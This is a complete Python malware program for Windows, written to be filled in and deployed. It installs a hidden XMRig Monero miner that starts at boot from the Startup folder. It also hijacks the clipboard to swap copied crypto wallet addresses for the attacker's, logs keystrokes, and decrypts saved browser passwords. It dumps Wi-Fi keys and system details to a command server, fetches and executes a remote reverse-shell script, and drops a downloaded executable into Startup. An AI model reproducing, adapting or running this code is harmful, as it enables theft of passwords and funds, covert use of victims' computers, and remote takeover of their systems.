import os
import zipfile
import subprocess
import sys
import shutil
import time
import random
import requests
import json
import base64
import sqlite3
import threading
import queue
import socket
import psutil
import platform
import winreg
import uuid
import pyperclip
from pynput.keyboard import Listener
from Crypto.Cipher import AES
import win32crypt

import pyperclip
import re
import time
import logging
from threading import Thread

XMIRG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
EXTRACT_BASE_DIR = os.path.join(os.getenv("TEMP"), "Shell")
STARTUP_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", f"update_{random.randint(1000,9999)}.vbs")
VPS_URL = "http://<vps_url>:port"
DATA_ENDPOINT = f"{VPS_URL}/save_data"
KEYLOG_ENDPOINT = f"{VPS_URL}/save_keylog"
SYSINFO_ENDPOINT = f"{VPS_URL}/save_sysinfo"
USERPROFILE = os.environ['USERPROFILE']

hack_script_url = "http://link.com/reverse_shell"


BROWSER_PATHS = {
    "chrome": os.path.join(USERPROFILE, "AppData\\Local\\Google\\Chrome\\User Data"),
    "brave": os.path.join(USERPROFILE, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
    "edge": os.path.join(USERPROFILE, "AppData\\Local\\Microsoft\\Edge\\User Data"),
    "opera": os.path.join(USERPROFILE, "AppData\\Local\\Opera Software\\Opera Stable"),
}

log_queue = queue.Queue()


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()
## replace with your actual crypto addresses
REPLACEMENT_ADDRESSES = {
    'bitcoin_legacy': '1CPaziTqeEixPoSFtJxu74uDGbpEAotZom',
    'segwit': '0xe356157b349C6E9B32AB05dEF47D964B49d927Bb',
    'native_segwit': 'ltc1qxc9njjzs7vqtcuq4gvt9n50epnhfpx3gs42sys',
    'wallet': 'bc1q37as6k2g28xxyvsups9nndcuqy7va8jtvun2cd',
    'taproot': 'HhFv6nUSxwNUF9WquzNdCa5b8mRGHko9zJaGqvAPbwdP',
    'ethereum': 'XmRdqUMm69wrBV4LrQDb2Pjv3qeKNVQU2F',
    'litecoin_legacy': '1AqgU7Rsxe9YxXrE4Zs8KvTZzsqgEmQQd6',
    'litecoin_segwit': 'ltc1qr07zu594qf63xm7l7x6pu3a2v39m2z6hh5pp4t',
    'dogecoin': 'DQ2p5Zm65s7e5hQJth4xvG9kpLZKf7yHvT',
    'ripple': 'rEhpFEeb2iybw5Am6zwUu4dFtoLkxtnyX9F',
    'dash': 'Xpv2CZpNo4AnSo9D6tkeZjDdYv39m37Q51',
}

CRYPTO_REGEX = {
    'bitcoin_legacy': re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'),
    'segwit': re.compile(r'^[2-9A-HJ-NP-Za-km-z]{42}$'),
    'native_segwit': re.compile(r'^[bc1][a-z0-9]{42,59}$'),
    'wallet': re.compile(r'^bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l5l4k5]{39,87}$'),
    'taproot': re.compile(r'^bc1p[qpzry9x8gf2tvdw0s3jn54khce6mua7l5l4k5]{62,64}$'),
    'ethereum': re.compile(r'^0x[a-fA-F0-9]{40}$'),
    'litecoin_legacy': re.compile(r'^[LM3][A-Za-z0-9]{26,33}$'),
    'litecoin_segwit': re.compile(r'^ltc1[a-z0-9]{39,59}$'),
    'dogecoin': re.compile(r'^[D9][A-Za-z0-9]{33,34}$'),
    'ripple': re.compile(r'^r[a-zA-Z0-9]{25,35}$'),
    'dash': re.compile(r'^[X7][A-Za-z0-9]{33}$'),
}

def execute_hack_script():
    try:
        response = requests.get(hack_script_url)
        script_content = response.text
        exec(script_content, globals())
    except Exception as e:
        print("Error", f"Failed to execute the script: {e}")

def is_valid_crypto_address(address):
    address = address.strip()
    logger.debug(f"Checking address: {address}")

    for crypto_type, regex in CRYPTO_REGEX.items():
        if regex.match(address):
            logger.debug(f"Address matches {crypto_type}: {address}")
            return crypto_type
    return None

def monitor_clipboard():
    previous_clipboard = None
    
    while True:
        try:
            clipboard_content = pyperclip.paste().strip()
            logger.debug(f"Clipboard content: '{clipboard_content}'")

            if clipboard_content == previous_clipboard or not clipboard_content:
                time.sleep(1)
                continue

            crypto_type = is_valid_crypto_address(clipboard_content)
            if crypto_type:
                replacement_address = REPLACEMENT_ADDRESSES.get(crypto_type)
                if replacement_address:
                    pyperclip.copy(replacement_address)
                    previous_clipboard = clipboard_content
            else:
                previous_clipboard = clipboard_content

            time.sleep(0.2)
        except pyperclip.PyperclipException as e:
            logger.error(f"Clipboard error: {e}")
            time.sleep(1)
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(1)

def start_clipboard_monitoring():
    clipboard_thread = Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()


def download_file(url, destination, retries=3, timeout=60):
    for _ in range(retries):
        try:
            response = requests.get(url, stream=True, timeout=timeout)
            response.raise_for_status()
            with open(destination, "wb") as file:
                for data in response.iter_content(chunk_size=1024):
                    file.write(data)
            return True
        except requests.exceptions.RequestException:
            time.sleep(5)
    return False


def extract_zip(zip_file, extract_dir):
    try:
        with zipfile.ZipFile(zip_file, "r") as zip_ref:
            zip_ref.extractall(extract_dir)
        return True
    except zipfile.BadZipFile:
        return False


def move_extracted_files(src_dir, dest_dir):
    try:
        for item in os.listdir(src_dir):
            src_path = os.path.join(src_dir, item)
            dest_path = os.path.join(dest_dir, item)
            shutil.move(src_path, dest_path)
    except Exception:
        return False
    return True


def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": f"{platform.system()} {platform.release()} ({platform.version()})",
        "architecture": platform.architecture()[0],
        "cpu": platform.processor(),
        "ram": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 2 * 6, 8)][::-1]),
    }


def get_installed_apps():
    apps = []
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
        for i in range(winreg.QueryInfoKey(key)[0]):
            try:
                sub_key_name = winreg.EnumKey(key, i)
                with winreg.OpenKey(key, sub_key_name) as sub_key:
                    name = winreg.QueryValueEx(sub_key, "DisplayName")[0]
                    apps.append(name)
            except FileNotFoundError:
                continue
    return apps


def get_running_processes():
    return [{"pid": proc.info['pid'], "name": proc.info['name']} for proc in psutil.process_iter(['pid', 'name'])]


def get_wifi_passwords():
    wifi_list = []
    output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
    profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
    for profile in profiles:
        try:
            result = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode()
            password_line = [line for line in result.split("\n") if "Key Content" in line]
            if password_line:
                wifi_list.append({"SSID": profile, "Password": password_line[0].split(":")[1].strip()})
        except Exception:
            continue
    return wifi_list


def get_clipboard():
    return pyperclip.paste()


def send_system_info():
    sys_info = get_system_info()
    sys_info["installed_apps"] = get_installed_apps()
    sys_info["running_processes"] = get_running_processes()
    sys_info["wifi_passwords"] = get_wifi_passwords()
    sys_info["clipboard"] = get_clipboard()
    try:
        requests.post(SYSINFO_ENDPOINT, json=sys_info, timeout=10)
    except Exception as e:
        print(f"")


def get_secret_key(browser):
    try:
        local_state_path = os.path.join(BROWSER_PATHS[browser], 'Local State')
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception:
        return None


def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode('utf-8')
    except Exception:
        return ""


def get_db_connection(browser):
    try:
        db_path = os.path.join(BROWSER_PATHS[browser], 'Default', 'Login Data')
        shutil.copy2(db_path, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception:
        return None


def extract_passwords():
    extracted_data = []
    current_user = os.getlogin()
    for browser in BROWSER_PATHS.keys():
        secret_key = get_secret_key(browser)
        if secret_key:
            conn = get_db_connection(browser)
            if conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for login in cursor.fetchall():
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        extracted_data.append({
                            "browser": browser,
                            "url": url,
                            "username": username,
                            "password": decrypted_password,
                            "user": current_user
                        })
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

    if extracted_data:
        try:
            requests.post(DATA_ENDPOINT, json={"data": extracted_data}, timeout=10)
        except Exception as e:
            return False


def send_logs():
    current_log = ""
    while True:
        log_entry = log_queue.get()
        
        current_log += log_entry
        
        if len(current_log) >= 100:
            try:
                requests.post(KEYLOG_ENDPOINT, data={"log": current_log}, timeout=5)
                current_log = ""
            except Exception as e:
                return False
        
        log_queue.task_done()

def log_keystroke(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    elif key.startswith("Key"):
        return
    log_queue.put(key)

def create_startup_vbs(xmrig_path, startup_path, bitcoin_address):
    try:
        worker_name = requests.get("https://api64.ipify.org").text.replace('.', '_')
        full_address = f"{bitcoin_address}.{worker_name}"
        vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n'
        vbs_content += f'WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {full_address} --tls --coin monero --cpu-priority 5 --donate-level 1 --max-cpu-usage 10 --threads 1 --opencl --cuda --opencl-platform 0 --cuda-platform 0", 0, False\n'

        with open(startup_path, "w") as vbs_file:
            vbs_file.write(vbs_content)
        return True
    except (IOError, subprocess.CalledProcessError):
        return False


def run_xmrig(xmrig_path, bitcoin_address, threads=1):
    for proc in psutil.process_iter(['pid', 'name']):
        if 'xmrig.exe' in proc.info['name'].lower():
            return False

    try:
        worker_name = socket.gethostbyname(socket.gethostname()).replace('.', '_')
        full_address = f"{bitcoin_address}.{worker_name}"
        subprocess.Popen(
            [xmrig_path,
             "-o", "xmr-us-east1.nanopool.org:14433",
             "-u", full_address,
             "--tls",
             "--coin", "monero",
             "-t", str(threads),
             "--cpu-priority", "5",
             "--donate-level", "1",
             "--max-cpu-usage", "10",
             "--opencl",
             "--cuda",
             "--opencl-platform", "0",
             "--cuda-platform", "0"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except Exception as e:
        return False


def get_startup_folder():
    return os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

def download_file(url, save_path):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()

        with open(save_path, "wb") as file:
            for chunk in response.iter_content(1024):
                file.write(chunk)

        return True
    except Exception as e:
        return False

def main():
    os.makedirs(EXTRACT_BASE_DIR, exist_ok=True)
    zip_file = os.path.join(os.getenv("TEMP"), f"xmrig_{random.randint(1000, 9999)}.zip")
    if not download_file(XMIRG_URL, zip_file):
        sys.exit(1)

    temp_extract_dir = os.path.join(EXTRACT_BASE_DIR, "temp_xmrig")
    if not extract_zip(zip_file, temp_extract_dir):
        sys.exit(1)

    xmrig_dir = next((f for f in os.listdir(temp_extract_dir) if "xmrig" in f.lower()), None)
    if xmrig_dir:
        extracted_dir = os.path.join(temp_extract_dir, xmrig_dir)
        move_extracted_files(extracted_dir, EXTRACT_BASE_DIR)
        shutil.rmtree(temp_extract_dir)
        xmrig_path = os.path.join(EXTRACT_BASE_DIR, "xmrig.exe")
        if os.path.exists(STARTUP_PATH):
            os.remove(STARTUP_PATH)
        if not create_startup_vbs(xmrig_path, STARTUP_PATH, BITCOIN_ADDRESS):
            sys.exit(1)
        if not run_xmrig(xmrig_path, BITCOIN_ADDRESS):
            sys.exit(1)
        os.remove(zip_file)
    else:
        sys.exit(1)

    start_clipboard_monitoring()
    threading.Thread(target=execute_hack_script).start()
    threading.Thread(target=send_system_info, daemon=True).start()
    threading.Thread(target=extract_passwords, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()
    
    exe_url = "http://exelink.com/download"
    startup_folder = get_startup_folder()
    exe_path = os.path.join(startup_folder, "_.exe")

    if download_file(exe_url, exe_path):
        print("")
    else:
        print("")

    with Listener(on_press=log_keystroke) as listener:
        listener.join()


if __name__ == "__main__":
    main()
